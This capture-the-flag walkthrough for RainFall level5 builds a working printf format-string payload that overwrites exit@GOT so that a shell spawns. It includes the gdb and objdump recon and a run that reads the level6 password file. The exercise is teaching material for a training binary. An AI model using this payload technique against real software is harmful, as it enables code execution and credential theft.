# RainFall — Level5 -> 6 Walkthrough (printf/GOT overwrite)

> Context: `level5` binary (no RELRO, no canary, NX disabled, no PIE). Goal is to pop a shell (function `o`) even though the program calls `exit` from `n`. We’ll abuse a format-string bug in `printf` to overwrite `exit@GOT` with the address of `o`.

---

## 1) Quick recon

```bash
$ file ./level5
$ checksec ./level5
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX disabled   No PIE
```

Run it:

```bash
$ ./level5
sdfsdf
sdfsdf

$ ./level5
aaaa %p %p %p
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0
```

It **echoes with `printf`** using our input as the *format string* → classic format-string vulnerability.

---

## 2) What does the code do?

Disassemble:

```bash
$ gdb ./level5
(gdb) info functions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

(gdb) disas main
0x08048504 <+0>: call 0x80484c2 <n>

(gdb) disas n
0x080484c2 <+0>:   ...
0x080484e5 <+35>:  call fgets
0x080484f3 <+49>:  call printf        ; uses our input as format string
0x080484f8 <+54>:  movl $0x1,(%esp)
0x080484ff <+61>:  call exit          ; program terminates here
```

So `n()` reads a line, **printfs it** (format string bug), then **calls `exit`**.

`o()` is our “win” function:

```bash
(gdb) disas o
0x080484a4 <+0>:  system(0x80485f0)   ; "/bin/sh" string
0x080484bd <+25>: _exit(1)
```

Plan: **overwrite `exit@GOT`** to point at `o`. When `n` calls `exit`, we’ll jump to `o` instead and get a shell.

---

## 3) Leak stack layout to find our arg index

We want to know which **positional specifier** (`%4$n`, `%5$n`, …) will reference a pointer we control.

```bash
$ python -c 'print "aaaa" + " %p" * 10' > /tmp/explo
$ ./level5 < /tmp/explo
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520 0x25207025 ...
```

Notice `0x61616161` (= `'aaaa'`) appears as the **4th** printed pointer after the three fixed values.
Therefore, **our first 4 bytes** (from the input buffer) are available to `printf` as the **4th variadic argument** → we’ll use **`%4$n`**.

---

## 4) Find the addresses

* **GOT entry of `exit`:**

```bash
$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

We’ll target: `exit@GOT = 0x08049838`.

* **Address of `o`:** from `gdb`: `o = 0x080484a4`.

We want to write the 32-bit value **`0x080484a4`** into memory at **`0x08049838`**.

---

## 5) Build the format string payload

Format-string trick:

* Put the **target address** at the start of the input so it sits where `printf` will fetch the 4th argument.
* Print **N characters**, then use **`%4$n`** to write that count to the address pointed to by the 4th argument.
* Choose **N = 0x080484a4 (decimal 134,513,828)**, adjusted for whatever bytes `printf` has already emitted before `%d`.

Working payload from your session:

```bash
$ python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/explo
```

Notes:

* `\x38\x98\x04\x08` is **little-endian** `0x08049838` (the GOT address for `exit`).
* We used `%134513824d` so that **total chars printed** at the moment of `%4$n` equals (in this runtime) the target value `0x080484a4`.
  Minor off-by-few adjustments are **normal** because some leading bytes (like the ASCII `'8'` from `0x38`) get printed and counted. If your value is off, tweak the number.

---

## 6) Trigger the overwrite and get a shell

Run the program with the crafted input:

```bash
$ cat /tmp/explo - | ./level5
```

Now the GOT slot for `exit` points to `o`. The next `exit()` from `n` actually calls `o` → `system("/bin/sh")` drops a shell under `level6`.

Use the implicit shell:

```bash
$ whoami
level6
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

---

## 7) Why this works (quick recap)

* **Vuln:** `printf(user_input)` (format string) lets us read/write arbitrary memory with `%p`, `%n`, etc.
* **No RELRO** means **GOT is writable** at runtime.
* **Overwrite `exit@GOT` → `o`** using `%n`.
* When `n()` calls `exit`, control flow diverts to `o()` → `system("/bin/sh")` → shell.

---

## 8) Troubleshooting tips

* If the program exits without shell: your write likely missed. Re-check:

  * Correct GOT entry (use `objdump -R`).
  * Correct target address of `o`.
  * Correct **positional index** for `%n` (here it’s `%4$n` because our data showed up as the 4th argument).
  * Adjust the decimal padding by a small amount (± a few) until the write lands exactly.
* If the program crashes immediately, you might be writing an impossible value or to the wrong place.
* If blocked by `Permission denied` writing to `/tmp/expl`, use a different filename (you used `/tmp/explo`, which worked).

---

That’s it. Clean, reliable GOT overwrite → shell → grab the next password.
